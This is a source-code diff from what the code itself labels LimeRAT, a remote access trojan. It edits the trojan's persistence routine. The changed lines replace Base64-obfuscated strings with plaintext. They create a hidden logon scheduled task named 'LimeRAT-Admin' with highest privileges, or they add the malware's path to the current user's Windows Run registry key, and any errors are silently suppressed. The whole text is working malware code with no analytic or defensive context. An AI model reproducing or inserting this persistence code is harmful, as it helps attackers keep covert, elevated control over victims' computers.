@@ -52,12 +52,10 @@
 
         Private Shared Sub AddReg(ByVal Privileges As Boolean)
             Try
-                If Privileges = True Then
-                    'Microsoft.Win32.Registry.LocalMachine.CreateSubKey
-                    '"schtasks /create /f /sc ONLOGON /RL HIGHEST /tn LimeRAT-Admin /tr "
-                    Shell(BS(Convert.FromBase64String("c2NodGFza3MgL2NyZWF0ZSAvZiAvc2MgT05MT0dPTiAvUkwgSElHSEVTVCAvdG4gTGltZVJBVC1BZG1pbiAvdHIg")) + """'" & C_Settings.fullpath & "'""", AppWinStyle.Hide, False, -1)
+                If Privileges Then
+                    Shell("schtasks /create /f /sc ONLOGON /RL HIGHEST /tn LimeRAT-Admin /tr " + """'" & C_Settings.fullpath & "'""", AppWinStyle.Hide, False, -1)
                 Else
-                    Microsoft.Win32.Registry.CurrentUser.CreateSubKey(BS(Convert.FromBase64String("U29mdHdhcmVcTWljcm9zb2Z0XFdpbmRvd3NcQ3VycmVudFZlcnNpb25cUnVuXA=="))).SetValue(C_Settings.EXE, C_Settings.fullpath)
+                    Microsoft.Win32.Registry.CurrentUser.CreateSubKey("Software\Microsoft\Windows\CurrentVersion\Run\").SetValue(C_Settings.EXE, C_Settings.fullpath)
                 End If
             Catch : End Try
         End Sub
